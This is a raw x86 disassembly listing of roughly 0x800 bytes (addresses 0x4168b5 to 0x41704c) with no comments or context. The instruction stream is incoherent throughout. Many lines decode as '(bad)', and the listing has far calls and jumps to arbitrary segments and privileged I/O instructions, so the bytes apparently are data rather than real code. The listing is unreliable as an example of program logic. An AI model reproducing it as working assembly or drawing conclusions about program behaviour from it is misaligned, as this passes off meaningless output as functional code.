  4168b5:	scas   eax,DWORD PTR es:[edi]
  4168b6:	call   0x7628:0x2c70e02a
  4168bd:	or     bh,BYTE PTR [eax-0x59cda8f3]
  4168c3:	push   esi
  4168c4:	cmp    al,0xcf
  4168c6:	push   0x905c0f01
  4168cb:	or     ebp,esi
  4168cd:	jl     0x416917
  4168cf:	retf   
  4168d0:	fmul   QWORD PTR [esi-0x60]
  4168d3:	call   0x1cfc:0x97859571
  4168da:	dec    esi
  4168db:	inc    edi
  4168dc:	ror    BYTE PTR [esi+0x7fb07b73],1
  4168e2:	iret   
  4168e3:	in     al,0x6e
  4168e5:	add    al,0xd1
  4168e7:	mov    eax,0xf08b4a7e
  4168ec:	jns    0x41687e
  4168ee:	shr    DWORD PTR [edx+0x53],1
  4168f1:	push   edx
  4168f2:	xchg   esp,eax
  4168f3:	push   ecx
  4168f4:	enter  0x39fd,0xdf
  4168f8:	dec    esi
  4168f9:	sbb    BYTE PTR [esi-0x671ba112],al
  4168ff:	add    ecx,DWORD PTR [esi+0x36f07353]
  416905:	int3   
  416906:	jle    0x416987
  416908:	push   esi
  416909:	sub    dh,cl
  41690b:	adc    ebp,ecx
  41690d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41690e:	mov    fs,WORD PTR [edi]
  416910:	mov    dl,0x45
  416912:	test   BYTE PTR [ebp+0x26],ah
  416915:	push   eax
  416916:	push   es
  416917:	inc    edi
  416918:	jae    0x41694c
  41691a:	ficomp WORD PTR [edi+0x52]
  41691d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41691e:	cmp    ah,bh
  416920:	(bad)  
  416921:	and    edi,DWORD PTR [ebx-0x11cebca]
  416927:	xor    eax,0x4060dafe
  41692c:	ficom  DWORD PTR [ebx+edi*4]
  41692f:	ret    0x9229
  416932:	stos   DWORD PTR es:[edi],eax
  416933:	mov    eax,0x391a33c2
  416938:	push   ebp
  416939:	in     eax,dx
  41693a:	dec    ebx
  41693b:	mov    edi,0xd2391b21
  416940:	dec    edi
  416941:	adc    al,0x2d
  416943:	std    
  416944:	mov    ss,ecx
  416946:	adc    ecx,eax
  416948:	ret    0xc765
  41694b:	mov    dh,0x34
  41694d:	ins    BYTE PTR es:[edi],dx
  41694e:	out    dx,eax
  41694f:	push   ebx
  416950:	fistp  DWORD PTR [esi]
  416952:	ins    BYTE PTR es:[edi],dx
  416953:	pop    eax
  416954:	or     DWORD PTR [ecx-0x7b054207],ebx
  41695a:	jo     0x416998
  41695c:	dec    ebp
  41695d:	ss pop esp
  41695f:	call   FWORD PTR [esi-0x42bdd49e]
  416965:	add    edx,edi
  416967:	jbe    0x416984
  416969:	mov    ah,0xde
  41696b:	(bad)  
  41696c:	cmp    al,0x5a
  41696e:	mov    ds:0x42e7cf1b,eax
  416973:	jnp    0x41694e
  416975:	mov    ds:0xc4afedd8,eax
  41697a:	(bad)  
  41697b:	cli    
  41697c:	test   BYTE PTR [ebp-0x48d61162],ah
  416982:	jnp    0x4169e7
  416984:	add    BYTE PTR [ecx+eiz*1-0x79398218],al
  41698b:	sub    eax,0xb72b6a7
  416990:	inc    ebp
  416991:	xchg   BYTE PTR [edi],bh
  416993:	rol    BYTE PTR [edx+eiz*4],cl
  416996:	stos   DWORD PTR es:[edi],eax
  416997:	loop   0x41693c
  416999:	ret    0x1bbd
  41699c:	ret    0xe0a4
  41699f:	sub    al,0x90
  4169a1:	push   ss
  4169a2:	mov    esp,0xb0c15b2d
  4169a7:	ins    DWORD PTR es:[edi],dx
  4169a8:	in     al,dx
  4169a9:	fild   DWORD PTR [ecx-0x1b7bcf57]
  4169af:	in     al,dx
  4169b0:	into   
  4169b1:	ret    0x6197
  4169b4:	mov    eax,ebx
  4169b6:	mov    ecx,0x32ab205
  4169bb:	lock lock add BYTE PTR [esp+eax*8+0x2a],0xc1
  4169c2:	xchg   ebx,eax
  4169c3:	jmp    0x51139860
  4169c8:	das    
  4169c9:	jmp    0x48fa:0x30f8c06b
  4169d0:	mov    cl,0xc6
  4169d2:	retf   
  4169d3:	repnz sub bl,BYTE PTR [edx+0x2143ad7d]
  4169da:	dec    esp
  4169db:	push   esi
  4169dc:	mov    ebx,DWORD PTR [edx-0x69]
  4169df:	pop    ebx
  4169e0:	aaa    
  4169e1:	sti    
  4169e2:	sub    edi,0xced1ce7a
  4169e8:	into   
  4169e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ea:	mov    ds:0x65e84623,al
  4169ef:	lea    ebx,[ecx]
  4169f1:	mov    ds:0xeb89b846,eax
  4169f6:	cmp    DWORD PTR [edi-0x33],eax
  4169f9:	shr    cl,cl
  4169fb:	repnz lds ecx,FWORD PTR ds:0xd146022b
  416a02:	ret    0xcfb6
  416a05:	cmc    
  416a06:	jnp    0x416a45
  416a08:	or     DWORD PTR [edx+0x71],eax
  416a0b:	outs   dx,DWORD PTR ds:[esi]
  416a0c:	stos   BYTE PTR es:[edi],al
  416a0d:	fld    TBYTE PTR [ebp+0x2c]
  416a10:	mov    eax,ds:0x549a7561
  416a15:	adc    eax,0xe528ebf
  416a1a:	mov    eax,0xcba70828
  416a1f:	dec    ebp
  416a20:	mov    ch,BYTE PTR [edi]
  416a22:	imul   ebx,DWORD PTR [esp+esi*1-0x38],0xffffffee
  416a27:	(bad)  
  416a29:	je     0x416aa2
  416a2b:	pushf  
  416a2c:	xchg   edi,eax
  416a2d:	(bad)  
  416a2e:	sbb    dl,BYTE PTR [esi-0x608c37a2]
  416a34:	xchg   ebp,eax
  416a35:	push   0xffffffa0
  416a37:	dec    edi
  416a38:	lods   eax,DWORD PTR ds:[esi]
  416a39:	fsubr  QWORD PTR [ecx-0x68]
  416a3c:	ret    
  416a3d:	mov    BYTE PTR [ecx],0x79
  416a40:	jno    0x416a9a
  416a42:	lock pusha 
  416a44:	fxch   st(6)
  416a46:	push   esi
  416a47:	test   eax,0xa68a42de
  416a4c:	bound  esi,QWORD PTR [ebp-0x76]
  416a4f:	and    DWORD PTR [ebp+esi*8+0x45e7dc8e],edx
  416a56:	mov    edx,DWORD PTR [edi-0x70ae1730]
  416a5c:	int3   
  416a5d:	add    bl,BYTE PTR [ebx]
  416a5f:	scas   al,BYTE PTR es:[edi]
  416a60:	daa    
  416a61:	xor    BYTE PTR [edi],bh
  416a63:	mov    WORD PTR ss:[ebp+0x60],?
  416a67:	mov    eax,0x5e5e3f32
  416a6c:	jmp    0x416a6f
  416a6e:	dec    esp
  416a6f:	nop
  416a70:	pushf  
  416a71:	xor    BYTE PTR [edx+edx*2],ch
  416a74:	mov    eax,ds:0x26ccc983
  416a79:	ret    
  416a7a:	mov    al,ds:0xbd5b6686
  416a7f:	pop    ebx
  416a80:	xchg   ebx,eax
  416a81:	dec    esp
  416a82:	and    ebx,DWORD PTR [edx-0x6871abda]
  416a88:	(bad)  
  416a89:	and    DWORD PTR [edi+0x31],edx
  416a8c:	dec    edi
  416a8d:	pop    ebx
  416a8e:	xor    bh,BYTE PTR [ebp+0x51d90ce7]
  416a94:	(bad)  
  416a95:	and    al,BYTE PTR [edx]
  416a97:	fwait
  416a98:	addr16 xor al,0x40
  416a9b:	dec    eax
  416a9c:	adc    BYTE PTR ds:0x5a9b1ba3,dh
  416aa2:	arpl   WORD PTR es:[edx-0x79],bx
  416aa6:	inc    di
  416aa8:	shl    BYTE PTR [esi+0xf2da1fa],cl
  416aae:	add    bh,BYTE PTR [eax+0x77812d6c]
  416ab4:	mov    ebx,0x170964aa
  416ab9:	(bad)  
  416aba:	mov    bh,0xd0
  416abc:	fdiv   QWORD PTR [edi]
  416abe:	xor    dl,cl
  416ac0:	inc    edi
  416ac1:	sbb    BYTE PTR [ebp-0x69cc749f],0x5c
  416ac8:	add    dl,BYTE PTR cs:[esi+0x37a3d7ab]
  416acf:	pop    ss
  416ad0:	xor    al,0xb2
  416ad2:	xchg   ecx,eax
  416ad3:	xor    eax,0x22286b1d
  416ad8:	sbb    BYTE PTR [edx],bh
  416ada:	push   esp
  416adb:	adc    ch,BYTE PTR [ecx-0x1d502f57]
  416ae1:	push   ds
  416ae2:	arpl   sp,sp
  416ae4:	xchg   eax,ecx
  416ae6:	nop
  416ae7:	es out 0xed,eax
  416aea:	out    dx,al
  416aeb:	jecxz  0x416a77
  416aed:	(bad)  
  416aee:	in     al,0xc7
  416af0:	lds    ecx,FWORD PTR [esi+esi*2-0x47ccd475]
  416af7:	mov    dl,0x91
  416af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416afa:	dec    edi
  416afb:	in     al,0xb4
  416afd:	mov    DWORD PTR [edi+0x3793aa2b],edx
  416b03:	neg    BYTE PTR [ebp-0x76]
  416b06:	stc    
  416b07:	mov    ebx,0x9b982d0
  416b0c:	es mov esi,0xbe2d2f6c
  416b12:	scas   eax,DWORD PTR es:[edi]
  416b13:	loop   0x416ac3
  416b15:	mov    ds:0x6d71c27d,al
  416b1a:	jle    0x416ab5
  416b1c:	and    eax,0x5a05b790
  416b21:	lods   eax,DWORD PTR ds:[esi]
  416b22:	adc    al,0x7a
  416b24:	cmp    DWORD PTR [ebp-0x3d],ecx
  416b27:	lods   al,BYTE PTR ds:[esi]
  416b28:	int3   
  416b29:	bound  eax,QWORD PTR [ecx-0x2840f628]
  416b2f:	push   edx
  416b31:	xchg   esp,eax
  416b32:	adc    ebp,esi
  416b34:	add    cl,BYTE PTR [edx-0x3cf39e54]
  416b3a:	sbb    al,0xf3
  416b3c:	fs push edx
  416b3e:	sub    BYTE PTR [ebx-0x32],dh
  416b41:	ins    BYTE PTR es:[edi],dx
  416b42:	test   eax,0x5e45c085
  416b47:	inc    ecx
  416b48:	repz mov ds:0xcaca0563,al
  416b4e:	rcl    BYTE PTR [eax],cl
  416b50:	out    dx,eax
  416b51:	mov    dh,BYTE PTR [ebp-0x5a]
  416b54:	test   al,0xf9
  416b56:	mov    edi,0x71d5bf67
  416b5b:	or     eax,0x4196c6b1
  416b60:	xlat   BYTE PTR ds:[ebx]
  416b61:	fimul  WORD PTR [esi]
  416b63:	ins    BYTE PTR es:[edi],dx
  416b64:	jno    0x416b1d
  416b66:	xor    DWORD PTR [eax+0x5f3890e4],0x66d37619
  416b70:	daa    
  416b71:	inc    esi
  416b72:	and    BYTE PTR [ecx-0x2d6b6f69],0xd1
  416b79:	hlt    
  416b7a:	(bad)  
  416b7b:	jg     0x416b7d
  416b7d:	fist   DWORD PTR [ecx]
  416b7f:	clc    
  416b80:	push   esi
  416b81:	or     al,0xd8
  416b83:	popa   
  416b84:	xor    BYTE PTR [ebp+edi*1+0x54644468],0xa0
  416b8c:	adc    dl,BYTE PTR [ebp+0x19]
  416b8f:	push   esi
  416b90:	push   esp
  416b91:	push   cs
  416b92:	fadd   QWORD PTR [ecx+0x567e2bc8]
  416b98:	ins    DWORD PTR es:[edi],dx
  416b99:	sub    al,0x9e
  416b9b:	sub    al,0x16
  416b9d:	popa   
  416b9e:	xor    BYTE PTR [edi-0xd92520],cl
  416ba4:	addr16 mov al,fs:0x6718
  416ba9:	inc    esp
  416baa:	mov    dl,0x6d
  416bac:	sub    eax,DWORD PTR [edx-0x1e]
  416baf:	call   0x24d7:0x4491be3c
  416bb6:	loope  0x416c29
  416bb8:	es ins BYTE PTR es:[edi],dx
  416bba:	int    0x26
  416bbc:	inc    esp
  416bbd:	stos   BYTE PTR es:[edi],al
  416bbe:	fnsave [edi]
  416bc0:	jg     0x416be7
  416bc2:	mov    esp,0x4ca6d28f
  416bc7:	dec    ecx
  416bc8:	sti    
  416bc9:	or     al,0xd
  416bcb:	int3   
  416bcc:	addr16 popf 
  416bce:	imul   esp,DWORD PTR [edx+0x50b62ff],0xffffff8c
  416bd5:	add    dh,BYTE PTR [ebx]
  416bd7:	jnp    0x416be6
  416bd9:	pop    ebp
  416bda:	jge    0x416ba2
  416bdc:	repnz lea edx,[edx+eax*1]
  416be0:	mov    al,0x63
  416be2:	nop
  416be3:	rcl    BYTE PTR [ebp+0x6c],cl
  416be6:	ja     0x416b7d
  416be8:	cmp    BYTE PTR [ebp-0x11],dl
  416beb:	test   eax,0x176463b
  416bf0:	leave  
  416bf1:	fisub  DWORD PTR [edx]
  416bf3:	inc    ebp
  416bf4:	xor    al,0xd4
  416bf6:	xor    BYTE PTR [ebp-0x2],0x12
  416bfa:	or     dl,BYTE PTR [esi-0x5f]
  416bfd:	lods   al,BYTE PTR ds:[esi]
  416bfe:	jnp    0x416c03
  416c00:	ins    DWORD PTR es:[edi],dx
  416c01:	cmp    eax,0x127ee93f
  416c06:	outs   dx,DWORD PTR ds:[esi]
  416c07:	and    DWORD PTR [edi+0x16],esp
  416c0a:	xchg   esi,eax
  416c0b:	xchg   ebp,eax
  416c0c:	mov    edx,0x4e48c6c8
  416c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c12:	loopne 0x416bc3
  416c14:	mov    edx,0xc79fd435
  416c19:	adc    BYTE PTR [eax-0x57],0x12
  416c1d:	fild   DWORD PTR [esi]
  416c1f:	mov    esi,ss
  416c21:	xor    BYTE PTR [ebx-0x70],0xa1
  416c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c26:	ins    BYTE PTR es:[edi],dx
  416c27:	jge    0x416c1e
  416c29:	cs jnp 0x416c6f
  416c2c:	iret   
  416c2d:	mov    ds,WORD PTR [ecx+0x67]
  416c30:	or     edx,DWORD PTR [edx-0x358f4cba]
  416c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c37:	mov    ds:0xa926d4f8,eax
  416c3c:	pop    ecx
  416c3d:	popa   
  416c3e:	and    al,0xb6
  416c40:	jmp    0x824147e1
  416c45:	adc    bl,BYTE PTR [eax]
  416c47:	ss push ebx
  416c49:	dec    ebx
  416c4a:	loope  0x416cb4
  416c4c:	dec    esi
  416c4d:	in     al,0x32
  416c4f:	or     ch,0xd1
  416c52:	cmp    DWORD PTR [eax],ecx
  416c54:	sub    al,0x7c
  416c56:	imul   cl
  416c58:	dec    ebp
  416c59:	daa    
  416c5a:	adc    esi,DWORD PTR ds:0x97a7f92e
  416c60:	xlat   BYTE PTR ds:[ebx]
  416c61:	and    DWORD PTR [edi+esi*4],ebp
  416c64:	cmp    DWORD PTR [edx],0xe24f083d
  416c6a:	out    0x86,eax
  416c6c:	mov    BYTE PTR [ebx-0x5687c7ad],cl
  416c72:	mov    al,0xcf
  416c74:	mov    ebp,0xd655c9f2
  416c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c7a:	fadd   DWORD PTR [eax+ebx*4-0x5b]
  416c7e:	mov    esp,0xea5c64af
  416c83:	pop    esp
  416c84:	ins    DWORD PTR es:[edi],dx
  416c85:	(bad)
  416c88:	aam    0x1a
  416c8a:	mov    BYTE PTR [ebx+0x48],ah
  416c8d:	retf   0x5b3b
  416c90:	fstp   TBYTE PTR [eax-0x56]
  416c93:	pop    edi
  416c94:	rcr    ch,0xd9
  416c97:	or     DWORD PTR [edi+0x7a],eax
  416c9a:	mov    BYTE PTR [ecx-0x5a3cb4d7],dh
  416ca0:	xchg   ebx,eax
  416ca1:	sahf   
  416ca2:	sub    BYTE PTR [ecx-0x4d],bh
  416ca5:	cmp    edx,DWORD PTR [esi]
  416ca7:	les    edx,FWORD PTR [eax-0x32]
  416caa:	aad    0x79
  416cac:	cmp    eax,0x4bd3f365
  416cb1:	mov    ebp,0xe8221da1
  416cb7:	ja     0x416c5b
  416cb9:	xor    bh,ch
  416cbb:	mov    esp,0x18af4ee3
  416cc0:	dec    eax
  416cc1:	mov    eax,ds:0x7b56bd32
  416cc6:	loop   0x416c8f
  416cc8:	cmc    
  416cc9:	mov    al,ds:0x211811c8
  416cce:	push   cs
  416ccf:	sub    bl,ch
  416cd1:	jb     0x416cf1
  416cd3:	or     ebp,DWORD PTR [esi-0x64]
  416cd6:	aam    0xc2
  416cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cd9:	jp     0x416c9f
  416cdb:	push   edi
  416cdc:	push   ebx
  416cdd:	inc    ecx
  416cde:	in     eax,dx
  416cdf:	fidivr DWORD PTR [edi+0x2855d6e1]
  416ce5:	jmp    0x3228:0x9aee5a8c
  416cec:	mov    dl,0xc0
  416cee:	test   ebx,ebx
  416cf0:	mov    esp,0xf22792d9
  416cf5:	call   0xc279932
  416cfa:	jg     0x416d24
  416cfc:	es xchg ebp,eax
  416cfe:	or     al,0x9
  416d00:	fstp   QWORD PTR [edi+0x167f6a29]
  416d06:	sti    
  416d07:	sbb    eax,0x8d5564fe
  416d0c:	jbe    0x416d3d
  416d0e:	mul    DWORD PTR [ebx]
  416d10:	mov    esi,DWORD PTR [ebp-0xe]
  416d13:	rcl    DWORD PTR [esi+0x680e28ce],0xe9
  416d1a:	mov    ebp,0x2fc23a40
  416d1f:	fsubr  QWORD PTR ds:0x8f0b01d
  416d25:	jno    0x416d6f
  416d27:	push   ecx
  416d28:	out    dx,al
  416d29:	jg     0x416cf6
  416d2b:	cdq    
  416d2c:	in     al,0x86
  416d2e:	sbb    eax,ecx
  416d30:	mov    edi,0xca1f64f6
  416d35:	cmp    ecx,0xffffff97
  416d38:	scas   al,BYTE PTR es:[edi]
  416d39:	fisubr WORD PTR [esi]
  416d3b:	xchg   esp,eax
  416d3c:	xor    ah,BYTE PTR [edx+0x30]
  416d3f:	stc    
  416d40:	and    bl,BYTE PTR [esi+ecx*4+0x44352b50]
  416d47:	xor    al,0x92
  416d49:	mov    esp,0x7b6c0916
  416d4e:	cmp    DWORD PTR [edi],esi
  416d50:	(bad)  
  416d51:	xor    al,dl
  416d53:	imul   ebp,DWORD PTR [edx+0x4685a2c5],0x10
  416d5a:	add    BYTE PTR [ecx-0x20],0xd6
  416d5e:	cmp    DWORD PTR [ecx+0x3b],ebp
  416d61:	pushf  
  416d62:	in     al,0x77
  416d64:	xchg   esp,eax
  416d65:	push   es
  416d66:	ins    DWORD PTR es:[edi],dx
  416d67:	or     eax,0x59d1167c
  416d6c:	(bad)  
  416d6d:	push   ebp
  416d6e:	stos   DWORD PTR es:[edi],eax
  416d6f:	lahf   
  416d70:	scas   eax,DWORD PTR es:[edi]
  416d71:	inc    esp
  416d72:	dec    ebx
  416d73:	sbb    eax,DWORD PTR [ebx-0x4f]
  416d76:	dec    esp
  416d77:	mov    eax,ds:0xddeabe89
  416d7c:	jo     0x416d9b
  416d7e:	fist   DWORD PTR [ebx+0x57]
  416d81:	pop    ebx
  416d82:	xor    al,BYTE PTR [edx]
  416d84:	cmp    esi,DWORD PTR [ecx]
  416d86:	imul   esp,esi,0x7a
  416d89:	dec    eax
  416d8a:	loope  0x416d16
  416d8c:	pop    esp
  416d8d:	out    dx,eax
  416d8e:	xchg   ebx,eax
  416d8f:	test   eax,0x78b4981a
  416d94:	jbe    0x416d75
  416d96:	mov    esi,0x45eb4ccd
  416d9b:	sub    ebp,DWORD PTR [ecx]
  416d9d:	inc    ebp
  416d9e:	neg    DWORD PTR [eax-0x63]
  416da1:	dec    ebx
  416da2:	mov    DWORD PTR [ecx+0x70bdabe7],edi
  416da8:	dec    edi
  416da9:	mov    bl,0x12
  416dab:	pop    ebx
  416dac:	mov    esp,0x66e51008
  416db1:	arpl   WORD PTR [edx+0x39],sp
  416db4:	push   esp
  416db5:	mov    WORD PTR [ecx+0x4d],cs
  416db8:	xor    BYTE PTR gs:[edi],0x33
  416dbc:	xchg   esp,eax
  416dbd:	ss das 
  416dbf:	adc    DWORD PTR [ebx-0x570a078d],esi
  416dc5:	jnp    0x416d9a
  416dc7:	(bad)  
  416dc8:	cmc    
  416dc9:	mov    WORD PTR [ecx-0x3e],es
  416dcc:	das    
  416dcd:	add    al,0xed
  416dd0:	cs inc esi
  416dd2:	fsub   st,st(0)
  416dd4:	int    0x8
  416dd6:	rcr    DWORD PTR [ecx+0x7bde94dc],0x91
  416ddd:	fcomip st,st(3)
  416ddf:	xchg   ebx,eax
  416de0:	imul   eax,esp,0x1f
  416de3:	arpl   WORD PTR [esi],si
  416de5:	(bad)  
  416de6:	fmul   DWORD PTR [esi-0x5e7164df]
  416dec:	cli    
  416ded:	dec    edx
  416dee:	mov    bh,0x3d
  416df0:	sti    
  416df1:	mov    bl,0xe6
  416df3:	stc    
  416df4:	(bad)  
  416df5:	mov    eax,0xa8863a1c
  416dfa:	jo     0x416e34
  416dfc:	push   ss
  416dfd:	gs sub edi,0x54
  416e01:	jge    0x416e1d
  416e03:	xchg   DWORD PTR [eax-0x2a645d12],ecx
  416e09:	mov    ?,edx
  416e0b:	cmp    ax,0x7ce8
  416e0f:	adc    eax,0xda06bc
  416e14:	arpl   di,cx
  416e16:	push   ss
  416e17:	mov    ecx,0x2672dfe2
  416e1c:	jns    0x416e3e
  416e1e:	mov    dl,0x40
  416e20:	cwde   
  416e21:	aaa    
  416e22:	mov    ch,0xb1
  416e24:	mov    dl,0xdc
  416e26:	pop    ecx
  416e27:	int    0xee
  416e29:	rcl    BYTE PTR [edx],cl
  416e2b:	jbe    0x416e1a
  416e2d:	cmc    
  416e2e:	mov    eax,0x4d9be9ec
  416e33:	dec    esi
  416e34:	xor    ebp,eax
  416e36:	(bad)  
  416e37:	adc    dl,BYTE PTR [edi+0x693a3abd]
  416e3d:	(bad)  
  416e3f:	mov    al,ds:0x44e252fd
  416e44:	imul   ecx,ecx,0x14f236d1
  416e4a:	loopne 0x416ec1
  416e4c:	push   edi
  416e4d:	fcomp  DWORD PTR [esi]
  416e4f:	push   0xffffff83
  416e51:	add    DWORD PTR [ecx-0x13],0xffffff95
  416e55:	lock (bad) 
  416e57:	mov    edi,gs
  416e59:	jbe    0x416ebd
  416e5b:	push   ecx
  416e5c:	pop    ebp
  416e5d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416e5f:	xchg   esp,eax
  416e60:	(bad)  
  416e61:	and    BYTE PTR ds:0x527b4086,al
  416e67:	mov    ah,0x92
  416e69:	pop    ds
  416e6a:	and    esi,DWORD PTR ds:0x1e5f6052
  416e70:	xor    BYTE PTR [edi-0x51f4be33],ah
  416e76:	fadd   DWORD PTR [ebx+0x56eddc61]
  416e7c:	mov    esi,0xe6dae633
  416e81:	(bad)  
  416e82:	mov    fs,ebp
  416e84:	and    bl,ch
  416e86:	adc    eax,0x94728c2b
  416e8b:	ret    0x1263
  416e8e:	sub    cl,ch
  416e90:	mov    edx,0x10521471
  416e95:	sbb    dl,BYTE PTR [ebx+0x3]
  416e98:	ret    
  416e99:	push   ebp
  416e9a:	mov    ebx,DWORD PTR ds:0xe2bae426
  416ea0:	sub    edi,DWORD PTR [ecx]
  416ea2:	idiv   DWORD PTR [ebp+0x4a]
  416ea5:	pop    ds
  416ea6:	sbb    BYTE PTR ds:0xb0ee165e,bl
  416eac:	sbb    DWORD PTR [esi-0x7a],eax
  416eaf:	push   ecx
  416eb0:	inc    ebp
  416eb1:	test   DWORD PTR [eax-0xb3b0e89],ebx
  416eb7:	fisub  WORD PTR [ecx+0x5a2cda1]
  416ebd:	sbb    esi,eax
  416ebf:	out    0x55,al
  416ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec2:	sti    
  416ec3:	outs   dx,DWORD PTR ds:[esi]
  416ec4:	pop    ebx
  416ec5:	pushf  
  416ec6:	(bad)  
  416ec7:	daa    
  416ec8:	ret    
  416ec9:	pop    ss
  416eca:	pop    edi
  416ecb:	xor    al,0xe6
  416ecd:	popa   
  416ece:	cmp    esp,ebp
  416ed0:	push   esp
  416ed1:	push   edi
  416ed2:	adc    eax,0xac756cac
  416ed7:	push   cs
  416ed8:	push   ecx
  416ed9:	popf   
  416eda:	dec    eax
  416edb:	loop   0x416f51
  416edd:	mov    fs,ebp
  416edf:	add    BYTE PTR [ebx-0x4e100404],ah
  416ee5:	sbb    al,0x26
  416ee7:	pop    esi
  416ee8:	out    dx,al
  416ee9:	add    BYTE PTR [esi-0x5bd94c2c],dh
  416eef:	mov    es,WORD PTR [esp+ebp*4-0x11]
  416ef3:	push   ecx
  416ef4:	sub    al,0x68
  416ef6:	test   al,0xd1
  416ef8:	xchg   DWORD PTR [esi+0x56],esi
  416efb:	pop    esp
  416efc:	fsubr  st(1),st
  416efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eff:	mov    cl,0xbb
  416f01:	(bad)  
  416f02:	fcom   QWORD PTR [edx-0x59a440a3]
  416f08:	popf   
  416f09:	loope  0x416f79
  416f0b:	or     al,0xbf
  416f0d:	cmp    BYTE PTR [esi+edx*1],dh
  416f10:	arpl   WORD PTR [ecx-0x71a349ea],di
  416f16:	xor    al,BYTE PTR [eax-0x3f64739d]
  416f1c:	adc    DWORD PTR [edx+0x1e],0xffffff97
  416f20:	jg     0x416ed4
  416f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f23:	rol    bl,1
  416f25:	fimul  DWORD PTR [esi]
  416f27:	mov    eax,ds:0x1d047212
  416f2c:	xlat   BYTE PTR ds:[ebx]
  416f2d:	adc    eax,0x58079bb4
  416f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f33:	push   edi
  416f34:	mov    bl,BYTE PTR [ebx+0x246f4754]
  416f3a:	jmp    0x1d12:0x6e76dd65
  416f41:	jge    0x416f27
  416f43:	paddusw mm4,mm4
  416f46:	mov    ebx,0xba07b125
  416f4b:	sub    al,0x8c
  416f4d:	shl    DWORD PTR [esi-0x14],1
  416f50:	es inc edi
  416f52:	jnp    0x416f2a
  416f54:	sub    DWORD PTR [eax],esi
  416f56:	lahf   
  416f57:	repz (bad) 
  416f59:	and    al,0x3e
  416f5b:	ret    
  416f5c:	fist   WORD PTR [ebx+0x6ccc4ff1]
  416f62:	or     BYTE PTR [esi-0x6bc4e3],0xae
  416f69:	sbb    ah,BYTE PTR [esi+0x28]
  416f6c:	sbb    edi,DWORD PTR [edx+0xd3d8685]
  416f72:	rol    BYTE PTR [ebx],1
  416f74:	push   ebx
  416f75:	ins    DWORD PTR es:[edi],dx
  416f76:	out    0xfe,eax
  416f78:	(bad)  
  416f79:	xchg   edi,eax
  416f7a:	jne    0x416f64
  416f7c:	jo     0x416fb0
  416f7e:	mov    esi,0xd8f5050c
  416f83:	add    edi,DWORD PTR [ebp+0x20]
  416f86:	mov    al,ds:0x3dfd77c5
  416f8b:	shl    BYTE PTR [esi],1
  416f8d:	push   ecx
  416f8e:	stos   DWORD PTR es:[edi],eax
  416f8f:	mov    ebp,0xcb357468
  416f94:	(bad)  
  416f96:	fstp   QWORD PTR [ebp-0x19]
  416f99:	cmp    eax,0xcf55ee4b
  416f9e:	loop   0x416ffb
  416fa0:	retf   0x32aa
  416fa3:	or     ch,dh
  416fa5:	fwait
  416fa6:	pop    edi
  416fa7:	mov    ebp,?
  416fa9:	or     edi,edi
  416fab:	adc    BYTE PTR [eax],0xdb
  416fae:	mov    dl,0x0
  416fb0:	pop    esp
  416fb1:	pusha  
  416fb2:	je     0x416f49
  416fb4:	push   esp
  416fb5:	xchg   DWORD PTR [ebx],ecx
  416fb7:	call   FWORD PTR [ebx+0x7da218b1]
  416fbd:	loopne 0x416f52
  416fbf:	inc    ecx
  416fc0:	xchg   ebp,eax
  416fc1:	cmc    
  416fc2:	xor    DWORD PTR [ebx],ecx
  416fc4:	sbb    esi,DWORD PTR [ebx+ebx*4-0x312c19b5]
  416fcb:	push   esi
  416fcc:	cmp    dh,bh
  416fce:	jl     0x416f85
  416fd0:	ins    DWORD PTR es:[edi],dx
  416fd1:	das    
  416fd2:	dec    ebx
  416fd3:	scas   eax,DWORD PTR es:[edi]
  416fd4:	push   eax
  416fd5:	jg     0x41703f
  416fd7:	mov    ebx,0xa0ab99f2
  416fdc:	sub    BYTE PTR [edx],0x8a
  416fdf:	jnp    0x416f76
  416fe1:	outs   dx,DWORD PTR ds:[esi]
  416fe2:	dec    esp
  416fe3:	jbe    0x417040
  416fe5:	icebp  
  416fe6:	sub    BYTE PTR [edi+0x22],dh
  416fe9:	xchg   edi,eax
  416fea:	and    BYTE PTR [edi],al
  416fec:	or     edi,eax
  416fee:	pop    ebx
  416fef:	dec    edi
  416ff0:	mov    bh,0x15
  416ff2:	adc    DWORD PTR [ecx],ebp
  416ff4:	sbb    al,0xaf
  416ff6:	xchg   BYTE PTR [ecx],ah
  416ff8:	scas   eax,DWORD PTR es:[edi]
  416ff9:	cmovo  ebp,DWORD PTR [edi+edi*4-0x44]
  416ffe:	dec    edi
  416fff:	mov    edx,0x2a962ab
  417004:	jmp    0x417049
  417006:	or     DWORD PTR [edi],ecx
  417008:	xchg   BYTE PTR [edx],bh
  41700a:	mov    cl,0x4e
  41700c:	(bad)  
  41700d:	std    
  41700e:	or     edx,DWORD PTR [ebx]
  417010:	shl    BYTE PTR [edi-0x3c],1
  417013:	(bad)  
  417014:	stos   DWORD PTR es:[edi],eax
  417015:	inc    esp
  417016:	aam    0x5f
  417018:	(bad)  
  417019:	rol    BYTE PTR [edi+0x3c67f068],1
  41701f:	push   ss
  417020:	arpl   WORD PTR ds:0x3fe90da,di
  417026:	fdiv   DWORD PTR [ebx-0x3b9444ee]
  41702c:	xlat   BYTE PTR ds:[ebx]
  41702d:	pop    eax
  41702e:	fs jb  0x4170a5
  417031:	imul   esp,DWORD PTR ds:0x9109b7b1,0x48
  417038:	pop    ecx
  417039:	sti    
  41703a:	push   0xffffff88
  41703c:	mov    ebp,DWORD PTR [edx+ecx*8-0x5d]
  417040:	outs   dx,DWORD PTR ds:[esi]
  417041:	jbe    0x416fed
  417043:	or     BYTE PTR [edi+0x21b70a43],dl
  417049:	pop    ss
  41704a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41704b:	(bad)  
  41704c:	sub    eax,0xb72f1938
